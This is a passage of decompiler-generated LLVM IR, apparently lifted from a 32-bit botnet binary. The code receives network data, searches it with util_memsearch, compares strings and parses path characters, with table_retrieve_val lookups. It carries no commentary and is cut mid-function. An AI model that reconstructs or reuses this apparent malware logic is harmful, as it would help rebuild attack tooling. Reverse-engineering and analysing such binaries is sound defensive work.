  %v2_804a165 = inttoptr i32 %v1_804a165 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8055864.21 to i32), i32* %v2_804a165, align 4
  %v1_804a16a = add i32 %v0_804a163, 108
  %v2_804a16a = inttoptr i32 %v1_804a16a to i32*
  %v3_804a16a = load i32, i32* %v2_804a16a, align 4
  %v2_804a16e = add i32 %v0_804a163, -12
  %v3_804a16e = inttoptr i32 %v2_804a16e to i32*
  store i32 %v3_804a16a, i32* %v3_804a16e, align 4
  %v1_804a16f = add i32 %v0_804a163, 131
  store i32 %v1_804a16f, i32* %ecx.global-to-local, align 4
  %v2_804a176 = add i32 %v0_804a163, -16
  %v3_804a176 = inttoptr i32 %v2_804a176 to i32*
  store i32 %v1_804a16f, i32* %v3_804a176, align 4
  %v4_804a177 = call i32 @util_memsearch(i32 %stack_var_-20888.0, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804a177, i32* %eax.global-to-local, align 4
  %v0_804a17c = load i32, i32* @esp, align 4
  %v1_804a17c = add i32 %v0_804a17c, 112
  %v2_804a17c = inttoptr i32 %v1_804a17c to i32*
  %v3_804a17c = load i32, i32* %v2_804a17c, align 4
  store i32 %v4_804a177, i32* @esi, align 4
  %v1_804a182 = add i32 %v3_804a17c, 1431
  %v9_804a182 = icmp eq i32 %v1_804a182, 0
  store i1 %v9_804a182, i1* %zf.global-to-local, align 1
  store i32 %v1_804a182, i32* @ebx, align 4
  %v1_804a188 = inttoptr i32 %v0_804a17c to i32*
  %v2_804a188 = load i32, i32* %v1_804a188, align 4
  store i32 %v2_804a188, i32* %eax.global-to-local, align 4
  %v3_804a188 = add i32 %v0_804a17c, 4
  %v1_804a189 = inttoptr i32 %v3_804a188 to i32*
  %v2_804a189 = load i32, i32* %v1_804a189, align 4
  store i32 %v2_804a189, i32* %edx.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8055875.24 to i32), i32* %v1_804a189, align 4
  %v0_804a18f = load i32, i32* @ebx, align 4
  store i32 %v0_804a18f, i32* %v1_804a188, align 4
  %v0_804a190 = call i32 @util_strcmp()
  store i32 %v0_804a190, i32* %eax.global-to-local, align 4
  %v0_804a195 = load i32, i32* @esp, align 4
  %v3_804a198 = trunc i32 %v0_804a190 to i8
  %v4_804a198 = icmp eq i8 %v3_804a198, 0
  store i1 %v4_804a198, i1* %zf.global-to-local, align 1
  br i1 %v4_804a198, label %dec_label_pc_804a2a2, label %dec_label_pc_804a1a0

dec_label_pc_804a1a0:                             ; preds = %dec_label_pc_804a2a2, %dec_label_pc_804a163
  %v0_804a1a0 = load i32, i32* @edi, align 4
  %v1_804a1a0 = add i32 %v0_804a1a0, -1448
  %v2_804a1a0 = inttoptr i32 %v1_804a1a0 to i8*
  store i8 7, i8* %v2_804a1a0, align 1
  br label %dec_label_pc_804a1a7

dec_label_pc_804a1a7:                             ; preds = %dec_label_pc_804a2ba, %dec_label_pc_804a1a0
  %v0_804a1a7 = load i32, i32* @esp, align 4
  %v1_804a1a7 = add i32 %v0_804a1a7, -4
  %v2_804a1a7 = inttoptr i32 %v1_804a1a7 to i32*
  store i32 16384, i32* %v2_804a1a7, align 4
  %v0_804a1ac = load i32, i32* @esi, align 4
  %v2_804a1ac = add i32 %v0_804a1a7, -8
  %v3_804a1ac = inttoptr i32 %v2_804a1ac to i32*
  store i32 %v0_804a1ac, i32* %v3_804a1ac, align 4
  %v1_804a1ad = add i32 %v0_804a1a7, 131
  store i32 %v1_804a1ad, i32* %eax.global-to-local, align 4
  %v2_804a1b4 = add i32 %v0_804a1a7, -12
  %v3_804a1b4 = inttoptr i32 %v2_804a1b4 to i32*
  store i32 %v1_804a1ad, i32* %v3_804a1b4, align 4
  %v0_804a1b5 = load i32, i32* @edi, align 4
  %v1_804a1b5 = add i32 %v0_804a1b5, -1452
  %v2_804a1b5 = inttoptr i32 %v1_804a1b5 to i32*
  %v3_804a1b5 = load i32, i32* %v2_804a1b5, align 4
  store i32 %v3_804a1b5, i32* %eax.global-to-local, align 4
  %v2_804a1bb = add i32 %v0_804a1a7, -16
  %v3_804a1bb = inttoptr i32 %v2_804a1bb to i32*
  store i32 %v3_804a1b5, i32* %v3_804a1bb, align 4
  %v0_804a1bc = call i32 @__libc_recv()
  store i32 %v0_804a1bc, i32* %eax.global-to-local, align 4
  %v0_804a1c1 = load i32, i32* @esp, align 4
  %v6_804a1c1 = icmp eq i32 %v0_804a1c1, -16
  store i1 %v6_804a1c1, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048e80

dec_label_pc_804a1c9:                             ; preds = %dec_label_pc_80496b5
  %v0_804a1c9 = load i32, i32* @ebp, align 4
  %v2_804a1c9 = add i32 %v0_80496d0, 28
  %v3_804a1c9 = inttoptr i32 %v2_804a1c9 to i32*
  store i32 %v0_804a1c9, i32* %v3_804a1c9, align 4
  %v0_804a1ca = load i32, i32* @ebp, align 4
  %v2_804a1ca = add i32 %v0_80496d0, 24
  %v3_804a1ca = inttoptr i32 %v2_804a1ca to i32*
  store i32 %v0_804a1ca, i32* %v3_804a1ca, align 4
  %v1_804a1cb = add i32 %v0_80496d0, 20
  %v2_804a1cb = inttoptr i32 %v1_804a1cb to i32*
  store i32 0, i32* %v2_804a1cb, align 4
  %v1_804a1cd = add i32 %v0_80496d0, 16
  %v2_804a1cd = inttoptr i32 %v1_804a1cd to i32*
  store i32 43, i32* %v2_804a1cd, align 4
  %v3_804a1cf = call i32 @table_retrieve_val(i32 %stack_var_-20888.0, i32* %v2_80490ce)
  store i32 %v3_804a1cf, i32* %eax.global-to-local, align 4
  %v0_804a1d4 = load i32, i32* @esp, align 4
  %v1_804a1d4 = add i32 %v0_804a1d4, -4
  %v2_804a1d4 = inttoptr i32 %v1_804a1d4 to i32*
  store i32 11, i32* %v2_804a1d4, align 4
  %v2_804a1d6 = add i32 %v0_804a1d4, -8
  %v3_804a1d6 = inttoptr i32 %v2_804a1d6 to i32*
  store i32 %v3_804a1cf, i32* %v3_804a1d6, align 4
  %v0_804a1d7 = load i32, i32* @edi, align 4
  %v1_804a1d7 = add i32 %v0_804a1d7, 660
  %v2_804a1d7 = inttoptr i32 %v1_804a1d7 to i32*
  %v3_804a1d7 = load i32, i32* %v2_804a1d7, align 4
  %v2_804a1dd = add i32 %v0_804a1d4, -12
  %v3_804a1dd = inttoptr i32 %v2_804a1dd to i32*
  store i32 %v3_804a1d7, i32* %v3_804a1dd, align 4
  %v0_804a1de = load i32, i32* @esi, align 4
  %v2_804a1de = add i32 %v0_804a1d4, -16
  %v3_804a1de = inttoptr i32 %v2_804a1de to i32*
  store i32 %v0_804a1de, i32* %v3_804a1de, align 4
  %v4_804a1df = call i32 @util_memsearch(i32 %stack_var_-20888.0, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804a1df, i32* %eax.global-to-local, align 4
  %v0_804a1e4 = load i32, i32* @esp, align 4
  %v1_804a1e7 = add i32 %v0_804a1e4, 28
  %v2_804a1e7 = inttoptr i32 %v1_804a1e7 to i32*
  store i32 1, i32* %v2_804a1e7, align 4
  %v1_804a1e9 = add i32 %v0_804a1e4, 24
  %v2_804a1e9 = inttoptr i32 %v1_804a1e9 to i32*
  store i32 ptrtoint (i32* @global_var_805587a.25 to i32), i32* %v2_804a1e9, align 4
  store i32 %v4_804a1df, i32* @ebx, align 4
  %v0_804a1f0 = load i32, i32* @esi, align 4
  %v2_804a1f0 = add i32 %v0_804a1f0, %v4_804a1df
  store i32 %v2_804a1f0, i32* @ebp, align 4
  %v0_804a1f3 = load i32, i32* @edi, align 4
  %v1_804a1f3 = add i32 %v0_804a1f3, 660
  %v2_804a1f3 = inttoptr i32 %v1_804a1f3 to i32*
  %v3_804a1f3 = load i32, i32* %v2_804a1f3, align 4
  %v2_804a1f9 = sub i32 %v3_804a1f3, %v4_804a1df
  %v12_804a1f9 = icmp eq i32 %v2_804a1f9, 0
  store i1 %v12_804a1f9, i1* %zf.global-to-local, align 1
  store i32 %v2_804a1f9, i32* %eax.global-to-local, align 4
  %v2_804a1fb = add i32 %v0_804a1e4, 20
  %v3_804a1fb = inttoptr i32 %v2_804a1fb to i32*
  store i32 %v2_804a1f9, i32* %v3_804a1fb, align 4
  %v0_804a1fc = load i32, i32* @ebp, align 4
  %v2_804a1fc = add i32 %v0_804a1e4, 16
  %v3_804a1fc = inttoptr i32 %v2_804a1fc to i32*
  store i32 %v0_804a1fc, i32* %v3_804a1fc, align 4
  %v4_804a1fd = call i32 @util_memsearch(i32 %stack_var_-20888.0, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804a1fd, i32* %eax.global-to-local, align 4
  %v0_804a202 = load i32, i32* @esp, align 4
  %v1_804a202 = add i32 %v0_804a202, 112
  %v2_804a202 = inttoptr i32 %v1_804a202 to i32*
  %v3_804a202 = load i32, i32* %v2_804a202, align 4
  store i32 %v3_804a202, i32* %edx.global-to-local, align 4
  %v1_804a206 = load i32, i32* @ebx, align 4
  %v2_804a206 = add i32 %v1_804a206, %v4_804a1fd
  store i32 %v2_804a206, i32* %eax.global-to-local, align 4
  %v2_804a208 = add i32 %v0_804a202, 80
  %v3_804a208 = inttoptr i32 %v2_804a208 to i32*
  store i32 %v2_804a206, i32* %v3_804a208, align 4
  %v0_804a20f = load i32, i32* %edx.global-to-local, align 4
  %v1_804a20f = load i32, i32* %eax.global-to-local, align 4
  %v2_804a20f = add i32 %v0_804a20f, 2115
  %v3_804a20f = add i32 %v2_804a20f, %v1_804a20f
  %v4_804a20f = inttoptr i32 %v3_804a20f to i8*
  store i8 0, i8* %v4_804a20f, align 1
  %v0_804a217 = load i32, i32* @edi, align 4
  %v1_804a217 = add i32 %v0_804a217, 16
  %v2_804a217 = inttoptr i32 %v1_804a217 to i32*
  %v3_804a217 = load i32, i32* %v2_804a217, align 4
  %v4_804a217 = add i32 %v3_804a217, -4
  %v9_804a217 = sub i32 3, %v3_804a217
  %v10_804a217 = and i32 %v9_804a217, %v3_804a217
  %v11_804a217 = icmp slt i32 %v10_804a217, 0
  %v12_804a217 = icmp eq i32 %v4_804a217, 0
  store i1 %v12_804a217, i1* %zf.global-to-local, align 1
  %v13_804a217 = icmp slt i32 %v4_804a217, 0
  %v3_804a21b = icmp ne i1 %v13_804a217, %v11_804a217
  %v4_804a21b = or i1 %v12_804a217, %v3_804a21b
  br i1 %v4_804a21b, label %dec_label_pc_804a2d0, label %dec_label_pc_804a221

dec_label_pc_804a221:                             ; preds = %dec_label_pc_804a2d0, %dec_label_pc_804a1c9, %dec_label_pc_804a2e5
  %v0_804a221 = load i32, i32* @edi, align 4
  %v1_804a221 = add i32 %v0_804a221, 12
  %v2_804a221 = inttoptr i32 %v1_804a221 to i32*
  store i32 -1, i32* %v2_804a221, align 4
  %v0_804a228 = load i32, i32* @edi, align 4
  %v1_804a228 = add i32 %v0_804a228, -1448
  %v2_804a228 = inttoptr i32 %v1_804a228 to i8*
  store i8 10, i8* %v2_804a228, align 1
  br label %dec_label_pc_8048e80

dec_label_pc_804a234:                             ; preds = %dec_label_pc_8049e64
  %v1_804a234 = add i32 %v0_8049e86, 20916
  %v2_804a234 = inttoptr i32 %v1_804a234 to i32*
  store i32 7, i32* %v2_804a234, align 4
  %v0_804a23f = load i32, i32* @esi, align 4
  %v1_804a23f = add i32 %v0_804a23f, 4
  %v2_804a23f = inttoptr i32 %v1_804a23f to i8*
  %v3_804a23f = load i8, i8* %v2_804a23f, align 1
  %v12_804a23f = icmp eq i8 %v3_804a23f, 115
  store i1 %v12_804a23f, i1* %zf.global-to-local, align 1
  br i1 %v12_804a23f, label %dec_label_pc_804a431, label %dec_label_pc_804a249

dec_label_pc_804a249:                             ; preds = %dec_label_pc_804a234, %dec_label_pc_804a431
  %v0_804a249 = load i32, i32* @esp, align 4
  %v1_804a249 = add i32 %v0_804a249, 20900
  %v2_804a249 = inttoptr i32 %v1_804a249 to i32*
  %v3_804a249 = load i32, i32* %v2_804a249, align 4
  store i32 %v3_804a249, i32* %eax.global-to-local, align 4
  %v0_804a250 = load i32, i32* @ebp, align 4
  %v2_804a250 = add i32 %v0_804a249, -4
  %v3_804a250 = inttoptr i32 %v2_804a250 to i32*
  store i32 %v0_804a250, i32* %v3_804a250, align 4
  %v0_804a251 = load i32, i32* @ebx, align 4
  %v1_804a251 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a251 = sub i32 %v0_804a251, %v1_804a251
  %v12_804a251 = icmp eq i32 %v2_804a251, 0
  store i1 %v12_804a251, i1* %zf.global-to-local, align 1
  store i32 %v2_804a251, i32* @ebx, align 4
  %v0_804a253 = load i32, i32* @esi, align 4
  %v2_804a253 = add i32 %v0_804a253, %v1_804a251
  store i32 %v2_804a253, i32* %eax.global-to-local, align 4
  %v2_804a256 = add i32 %v0_804a249, -8
  %v3_804a256 = inttoptr i32 %v2_804a256 to i32*
  store i32 %v2_804a251, i32* %v3_804a256, align 4
  %v0_804a257 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a257 = add i32 %v0_804a249, -12
  %v3_804a257 = inttoptr i32 %v2_804a257 to i32*
  store i32 %v0_804a257, i32* %v3_804a257, align 4
  %v0_804a258 = load i32, i32* @esi, align 4
  %v2_804a258 = add i32 %v0_804a249, -16
  %v3_804a258 = inttoptr i32 %v2_804a258 to i32*
  store i32 %v0_804a258, i32* %v3_804a258, align 4
  %v4_804a259 = call i32 @memmove(i8* %v1_8048f9a, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804a259, i32* %eax.global-to-local, align 4
  %v0_804a25e = load i32, i32* @esp, align 4
  %v1_804a25e = add i32 %v0_804a25e, 20916
  %v2_804a25e = inttoptr i32 %v1_804a25e to i32*
  store i32 0, i32* %v2_804a25e, align 4
  %v0_804a269 = load i32, i32* @esi, align 4
  %v1_804a269 = inttoptr i32 %v0_804a269 to i8*
  %v2_804a269 = load i8, i8* %v1_804a269, align 1
  %v3_804a269 = zext i8 %v2_804a269 to i32
  %v5_804a269 = and i32 %v4_804a259, -256
  %v6_804a269 = or i32 %v3_804a269, %v5_804a269
  store i32 %v6_804a269, i32* %eax.global-to-local, align 4
  %v0_804a26b = load i32, i32* @esp, align 4
  %v1_804a26b = add i32 %v0_804a26b, 16
  %v4_804a26e = icmp eq i8 %v2_804a269, 0
  store i1 %v4_804a26e, i1* %zf.global-to-local, align 1
  br i1 %v4_804a26e, label %dec_label_pc_8049cdc, label %dec_label_pc_804a276

dec_label_pc_804a276:                             ; preds = %dec_label_pc_804a249
  store i32 %v0_804a269, i32* %edx.global-to-local, align 4
  %v10_804a278 = icmp eq i8 %v2_804a269, 47
  store i1 %v10_804a278, i1* %zf.global-to-local, align 1
  br i1 %v10_804a278, label %dec_label_pc_8049cd9, label %dec_label_pc_804a280

dec_label_pc_804a280:                             ; preds = %dec_label_pc_804a276
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804a28c

dec_label_pc_804a284:                             ; preds = %dec_label_pc_804a28c
  %v10_804a284 = icmp eq i8 %v2_804a297, 47
  store i1 %v10_804a284, i1* %zf.global-to-local, align 1
  br i1 %v10_804a284, label %dec_label_pc_8049cd9, label %dec_label_pc_804a284.dec_label_pc_804a28c_crit_edge

dec_label_pc_804a284.dec_label_pc_804a28c_crit_edge: ; preds = %dec_label_pc_804a284
  %v1_804a28d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804a28c

dec_label_pc_804a28c:                             ; preds = %dec_label_pc_804a284.dec_label_pc_804a28c_crit_edge, %dec_label_pc_804a280
  %v1_804a28d = phi i32 [ %v1_804a28d.pre, %dec_label_pc_804a284.dec_label_pc_804a28c_crit_edge ], [ %v1_804a26b, %dec_label_pc_804a280 ]
  %v0_804a28c = phi i32 [ %v1_804a294, %dec_label_pc_804a284.dec_label_pc_804a28c_crit_edge ], [ 0, %dec_label_pc_804a280 ]
  %v1_804a28c = add i32 %v0_804a28c, 1
  %v8_804a28c = icmp eq i32 %v1_804a28c, 0
  store i1 %v8_804a28c, i1* %zf.global-to-local, align 1
  store i32 %v1_804a28c, i32* @ecx, align 4
  %v2_804a28d = add i32 %v1_804a28d, 20900
  %v3_804a28d = inttoptr i32 %v2_804a28d to i32*
  store i32 %v1_804a28c, i32* %v3_804a28d, align 4
  %v0_804a294 = load i32, i32* @esi, align 4
  %v1_804a294 = load i32, i32* @ecx, align 4
  %v2_804a294 = add i32 %v1_804a294, %v0_804a294
  store i32 %v2_804a294, i32* %edx.global-to-local, align 4
  %v1_804a297 = inttoptr i32 %v2_804a294 to i8*
  %v2_804a297 = load i8, i8* %v1_804a297, align 1
  %v3_804a297 = zext i8 %v2_804a297 to i32
  %v4_804a297 = load i32, i32* %eax.global-to-local, align 4
  %v5_804a297 = and i32 %v4_804a297, -256
  %v6_804a297 = or i32 %v5_804a297, %v3_804a297
  store i32 %v6_804a297, i32* %eax.global-to-local, align 4
  %v4_804a299 = icmp eq i8 %v2_804a297, 0
  store i1 %v4_804a299, i1* %zf.global-to-local, align 1
  %v1_804a29b = icmp eq i1 %v4_804a299, false
  br i1 %v1_804a29b, label %dec_label_pc_804a284, label %dec_label_pc_8049cdc

dec_label_pc_804a2a2:                             ; preds = %dec_label_pc_804a163
  %v2_804a2a2 = add i32 %v0_804a195, 12
  %v3_804a2a2 = inttoptr i32 %v2_804a2a2 to i32*
  store i32 %v0_804a190, i32* %v3_804a2a2, align 4
  %v2_804a2a3 = add i32 %v0_804a195, 8
  %v3_804a2a3 = inttoptr i32 %v2_804a2a3 to i32*
  store i32 %v0_804a190, i32* %v3_804a2a3, align 4
  %v1_804a2a4 = add i32 %v0_804a195, 4
  %v2_804a2a4 = inttoptr i32 %v1_804a2a4 to i32*
  store i32 ptrtoint ([4 x i8]* @global_var_8055854.12 to i32), i32* %v2_804a2a4, align 4
  %v0_804a2a9 = load i32, i32* @ebx, align 4
  %v3_804a2a9 = inttoptr i32 %v0_804a195 to i32*
  store i32 %v0_804a2a9, i32* %v3_804a2a9, align 4
  %v0_804a2aa = call i32 @util_strcmp()
  store i32 %v0_804a2aa, i32* %eax.global-to-local, align 4
  %v0_804a2af = load i32, i32* @esp, align 4
  %v3_804a2b2 = trunc i32 %v0_804a2aa to i8
  %v4_804a2b2 = icmp eq i8 %v3_804a2b2, 0
  store i1 %v4_804a2b2, i1* %zf.global-to-local, align 1
  %v1_804a2b4 = icmp eq i1 %v4_804a2b2, false
  br i1 %v1_804a2b4, label %dec_label_pc_804a1a0, label %dec_label_pc_804a2ba

dec_label_pc_804a2ba:                             ; preds = %dec_label_pc_804a2a2
  %v1_804a2ba = add i32 %v0_804a2af, 124
  %v2_804a2ba = inttoptr i32 %v1_804a2ba to i32*
  %v3_804a2ba = load i32, i32* %v2_804a2ba, align 4
  %v4_804a2ba = load i32, i32* @esi, align 4
  %v5_804a2ba = sub i32 %v3_804a2ba, %v4_804a2ba
  %v11_804a2ba = xor i32 %v4_804a2ba, %v3_804a2ba
  %v12_804a2ba = xor i32 %v5_804a2ba, %v3_804a2ba
  %v13_804a2ba = and i32 %v12_804a2ba, %v11_804a2ba
  %v14_804a2ba = icmp slt i32 %v13_804a2ba, 0
  %v15_804a2ba = icmp eq i32 %v5_804a2ba, 0
  store i1 %v15_804a2ba, i1* %zf.global-to-local, align 1
  %v16_804a2ba = icmp slt i32 %v5_804a2ba, 0
  %v3_804a2be = icmp eq i1 %v16_804a2ba, %v14_804a2ba
  %v4_804a2be = icmp eq i1 %v15_804a2ba, false
  %v5_804a2be = and i1 %v4_804a2be, %v3_804a2be
  %v6_804a2be = zext i1 %v5_804a2be to i32
  %v8_804a2be = and i32 %v0_804a2aa, -256
  %v9_804a2be = or i32 %v6_804a2be, %v8_804a2be
  %v2_804a2c1 = mul i32 %v9_804a2be, 8
  %v3_804a2c1 = add nsw i32 %v9_804a2be, 1
  %v4_804a2c1 = add i32 %v3_804a2c1, %v2_804a2c1
  store i32 %v4_804a2c1, i32* %eax.global-to-local, align 4
  %v1_804a2c5 = trunc i32 %v4_804a2c1 to i8
  %v2_804a2c5 = load i32, i32* @edi, align 4
  %v3_804a2c5 = add i32 %v2_804a2c5, -1448
  %v4_804a2c5 = inttoptr i32 %v3_804a2c5 to i8*
  store i8 %v1_804a2c5, i8* %v4_804a2c5, align 1
  br label %dec_label_pc_804a1a7

dec_label_pc_804a2d0:                             ; preds = %dec_label_pc_804a1c9
  %v0_804a2d0 = load i32, i32* @esp, align 4
  %v9_804a2d0 = icmp eq i32 %v0_804a2d0, 12
  store i1 %v9_804a2d0, i1* %zf.global-to-local, align 1
  %v0_804a2d3 = load i32, i32* @ebp, align 4
  %v2_804a2d3 = add i32 %v0_804a2d0, -16
  %v3_804a2d3 = inttoptr i32 %v2_804a2d3 to i32*
  store i32 %v0_804a2d3, i32* %v3_804a2d3, align 4
  %v2_804a2d4 = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_804a2d4, i32* %eax.global-to-local, align 4
  %v0_804a2d9 = load i32, i32* @esp, align 4
  %v1_804a2dc = add i32 %v2_804a2d4, -127
  %v6_804a2dc = sub i32 126, %v2_804a2d4
  %v7_804a2dc = and i32 %v6_804a2dc, %v2_804a2d4
  %v8_804a2dc = icmp slt i32 %v7_804a2dc, 0
  %v9_804a2dc = icmp eq i32 %v1_804a2dc, 0
  store i1 %v9_804a2dc, i1* %zf.global-to-local, align 1
  %v10_804a2dc = icmp slt i32 %v1_804a2dc, 0
  %v3_804a2df = icmp eq i1 %v10_804a2dc, %v8_804a2dc
  %v4_804a2df = icmp eq i1 %v9_804a2dc, false
  %v5_804a2df = and i1 %v4_804a2df, %v3_804a2df
  br i1 %v5_804a2df, label %dec_label_pc_804a221, label %dec_label_pc_804a2e5

dec_label_pc_804a2e5:                             ; preds = %dec_label_pc_804a2d0
  %v0_804a2e5 = load i32, i32* @ecx, align 4
  %v2_804a2e5 = add i32 %v0_804a2d9, 12
  %v3_804a2e5 = inttoptr i32 %v2_804a2e5 to i32*
  store i32 %v0_804a2e5, i32* %v3_804a2e5, align 4
  %v0_804a2e6 = load i32, i32* @ecx, align 4
  %v2_804a2e6 = add i32 %v0_804a2d9, 8
  %v3_804a2e6 = inttoptr i32 %v2_804a2e6 to i32*
  store i32 %v0_804a2e6, i32* %v3_804a2e6, align 4
  %v0_804a2e7 = load i32, i32* @ebp, align 4
  %v2_804a2e7 = add i32 %v0_804a2d9, 4
  %v3_804a2e7 = inttoptr i32 %v2_804a2e7 to i32*
  store i32 %v0_804a2e7, i32* %v3_804a2e7, align 4
  %v0_804a2e8 = load i32, i32* @edi, align 4
  %v1_804a2e8 = add i32 %v0_804a2e8, 16
  %v2_804a2e8 = inttoptr i32 %v1_804a2e8 to i32*
  %v3_804a2e8 = load i32, i32* %v2_804a2e8, align 4
  store i32 %v3_804a2e8, i32* %eax.global-to-local, align 4
  %v1_804a2eb = add i32 %v0_804a2d9, 112
  %v2_804a2eb = inttoptr i32 %v1_804a2eb to i32*
  %v3_804a2eb = load i32, i32* %v2_804a2eb, align 4
  store i32 %v3_804a2eb, i32* %ecx.global-to-local, align 4
  %v2_804a2ef = mul i32 %v3_804a2e8, 128
  %v3_804a2ef = icmp eq i32 %v2_804a2ef, 0
  store i1 %v3_804a2ef, i1* %zf.global-to-local, align 1
  %v2_804a2f2 = add i32 %v2_804a2ef, 1472
  %v3_804a2f2 = add i32 %v2_804a2f2, %v3_804a2eb
  store i32 %v3_804a2f2, i32* @eax, align 4
  %v3_804a2f9 = inttoptr i32 %v0_804a2d9 to i32*
  store i32 %v3_804a2f2, i32* %v3_804a2f9, align 4
  %v3_804a2fa = call i32 @util_strcpy(i8* %v1_8048f9a, i32 %v3_8048a9f)
  store i32 %v3_804a2fa, i32* %eax.global-to-local, align 4
  %v0_804a2ff = load i32, i32* @edi, align 4
  %v1_804a2ff = add i32 %v0_804a2ff, 16
  %v2_804a2ff = inttoptr i32 %v1_804a2ff to i32*
  %v3_804a2ff = load i32, i32* %v2_804a2ff, align 4
  store i32 %v3_804a2ff, i32* %eax.global-to-local, align 4
  %v0_804a302 = load i32, i32* @esp, align 4
  %v1_804a302 = add i32 %v0_804a302, 112
  %v2_804a302 = inttoptr i32 %v1_804a302 to i32*
  %v3_804a302 = load i32, i32* %v2_804a302, align 4
  store i32 %v3_804a302, i32* %edx.global-to-local, align 4
  %v2_804a306 = mul i32 %v3_804a2ff, 128
  %v3_804a306 = icmp eq i32 %v2_804a306, 0
  store i1 %v3_804a306, i1* %zf.global-to-local, align 1
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v2_804a309 = add i32 %v2_804a306, 1472
  %v3_804a309 = add i32 %v2_804a309, %v3_804a302
  store i32 %v3_804a309, i32* %ebx.global-to-local, align 4
  %v2_804a310 = inttoptr i32 %v0_804a302 to i32*
  store i32 %v3_804a309, i32* %v2_804a310, align 4
  %v2_804a313 = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_804a313, i32* @eax, align 4
  %v0_804a318 = load i32, i32* @esp, align 4
  %v1_804a318 = inttoptr i32 %v0_804a318 to i32*
  %v2_804a318 = load i32, i32* %v1_804a318, align 4
  store i32 %v2_804a318, i32* @ebp, align 4
  %v3_804a318 = add i32 %v0_804a318, 4
  %v0_804a319 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804a319 = add i32 %v0_804a319, %v2_804a313
  %v12_804a319 = icmp eq i32 %v2_804a319, 0
  store i1 %v12_804a319, i1* %zf.global-to-local, align 1
  store i32 %v2_804a319, i32* @ebx, align 4
  %v1_804a31b = inttoptr i32 %v3_804a318 to i32*
  %v2_804a31b = load i32, i32* %v1_804a31b, align 4
  store i32 %v2_804a31b, i32* %edx.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8055b39.26 to i32), i32* %v1_804a31b, align 4
  %v0_804a321 = load i32, i32* @ebx, align 4
  store i32 %v0_804a321, i32* %v1_804a318, align 4
  %v3_804a322 = call i32 @util_strcpy(i8* %v1_8048f9a, i32 %v3_8048a9f)
  store i32 %v3_804a322, i32* %eax.global-to-local, align 4
  %v0_804a327 = load i32, i32* @esp, align 4
  %v1_804a327 = add i32 %v0_804a327, 80
  %v2_804a327 = inttoptr i32 %v1_804a327 to i32*
  %v3_804a327 = load i32, i32* %v2_804a327, align 4
  store i32 %v3_804a327, i32* %ebx.global-to-local, align 4
  %v1_804a32b = add i32 %v0_804a327, -4
  %v2_804a32b = inttoptr i32 %v1_804a32b to i32*
  store i32 1, i32* %v2_804a32b, align 4
  %v1_804a32d = add i32 %v0_804a327, -8
  %v2_804a32d = inttoptr i32 %v1_804a32d to i32*
  store i32 ptrtoint (i32* @global_var_805587a.25 to i32), i32* %v2_804a32d, align 4
  %v0_804a332 = load i32, i32* @edi, align 4
  %v1_804a332 = add i32 %v0_804a332, 660
  %v2_804a332 = inttoptr i32 %v1_804a332 to i32*
  %v3_804a332 = load i32, i32* %v2_804a332, align 4
  %v0_804a338 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804a338 = add i32 %v0_804a338, 3
  store i32 %v1_804a338, i32* @ebx, align 4
  %v0_804a33b = load i32, i32* @esi, align 4
  %v2_804a33b = add i32 %v0_804a33b, %v1_804a338
  store i32 %v2_804a33b, i32* @esi, align 4
  %v2_804a33d = sub i32 %v3_804a332, %v1_804a338
  %v12_804a33d = icmp eq i32 %v2_804a33d, 0
  store i1 %v12_804a33d, i1* %zf.global-to-local, align 1
  store i32 %v2_804a33d, i32* %eax.global-to-local, align 4
  %v2_804a33f = add i32 %v0_804a327, -12
  %v3_804a33f = inttoptr i32 %v2_804a33f to i32*
  store i32 %v2_804a33d, i32* %v3_804a33f, align 4
  %v0_804a340 = load i32, i32* @esi, align 4
  %v2_804a340 = add i32 %v0_804a327, -16
  %v3_804a340 = inttoptr i32 %v2_804a340 to i32*
  store i32 %v0_804a340, i32* %v3_804a340, align 4
  %v4_804a341 = call i32 @util_memsearch(i32 %stack_var_-20888.0, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804a341, i32* %eax.global-to-local, align 4
  %v0_804a346 = load i32, i32* @esp, align 4
  %v1_804a346 = add i32 %v0_804a346, 128
  %v2_804a346 = inttoptr i32 %v1_804a346 to i32*
  %v3_804a346 = load i32, i32* %v2_804a346, align 4
  store i32 %v3_804a346, i32* %ecx.global-to-local, align 4
  %v0_804a34d = load i32, i32* @ebx, align 4
  %v2_804a34d = add i32 %v0_804a34d, %v4_804a341
  store i32 %v2_804a34d, i32* %ebx.global-to-local, align 4
  %v0_804a34f = load i32, i32* @edi, align 4
  %v1_804a34f = add i32 %v0_804a34f, 16
  %v2_804a34f = inttoptr i32 %v1_804a34f to i32*
  %v3_804a34f = load i32, i32* %v2_804a34f, align 4
  %v2_804a352 = mul i32 %v3_804a34f, 128
  store i32 %v2_804a352, i32* %eax.global-to-local, align 4
  %v9_804a355 = icmp eq i32 %v0_804a346, -20
  store i1 %v9_804a355, i1* %zf.global-to-local, align 1
  %v2_804a358 = add i32 %v3_804a346, 2115
  %v3_804a358 = add i32 %v2_804a358, %v2_804a34d
  %v4_804a358 = inttoptr i32 %v3_804a358 to i8*
  store i8 0, i8* %v4_804a358, align 1
  %v0_804a360 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804a360 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a360 = add i32 %v0_804a360, 1472
  %v3_804a360 = add i32 %v2_804a360, %v1_804a360
